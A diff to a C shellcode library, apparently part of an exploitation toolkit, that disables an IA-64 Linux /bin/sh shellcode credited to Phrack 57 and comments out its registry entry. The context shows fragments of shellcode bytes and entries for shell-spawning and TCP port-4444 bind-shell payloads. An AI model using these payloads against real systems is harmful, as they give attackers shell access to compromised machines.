@@ -68,8 +68,10 @@ freebsd_selfsigstop:
 
 #endif
 
+#if 0
+// dump warns and it has not been tested.. out!
 /* from phrack57 */
-unsigned long ia64_linux_binsh[] = {
+unsigned long long ia64_linux_binsh[] = {
   /* MLX
    * alloc r34 = ar.pfs, 0, 3, 3, 0   // allocate vars for syscall
    * movl r14 = 0x0168732f6e69622f    // aka "/bin/sh",0x01
@@ -132,7 +134,7 @@ unsigned long ia64_linux_binsh[] = {
   0x3a301799483f8011,
   0x0180016001467e8f,
 };
-
+#endif
 
 unsigned char nopcode_carver[] ="\x61\x66\x3D\x90\x90\x75\xF9\x54\xc3";
 
@@ -738,7 +740,7 @@ struct shellcode_t shellcodes[] = {
  ENTRY(0,0,0,"ppc.bsd.binsh",         ppc_bsd_binsh,            "Runs /bin/sh" )
  ENTRY(0,0,0,"sparc.linux.binsh",  sparc_linux_binsh,     "Runs /bin/sh on sparc/linux" )
  ENTRY(0,0,0,"sparc.linux.bind4444",  sparc_linux_bind4444,     "Binds a shell at TCP port 4444" )
- ENTRY(0,0,0,"ia64.linux.binsh",      ia64_linux_binsh,         "Executes /bin/sh on Intel Itanium" )
+ //ENTRY(0,0,0,"ia64.linux.binsh",      ia64_linux_binsh,         "Executes /bin/sh on Intel Itanium" )
  ENTRY(0,0,0,"x64.linux.binsh",       x64_linux_binsh,          "Runs /bin/sh on 64 bits" )
  ENTRY(0,0,0,"x86.bsd.binsh",         x86_bsd_binsh,            "Executes /bin/sh" )
  ENTRY(0,0,0,"x86.bsd.binsh2",        x86_bsd_binsh2,           "Executes /bin/sh" )
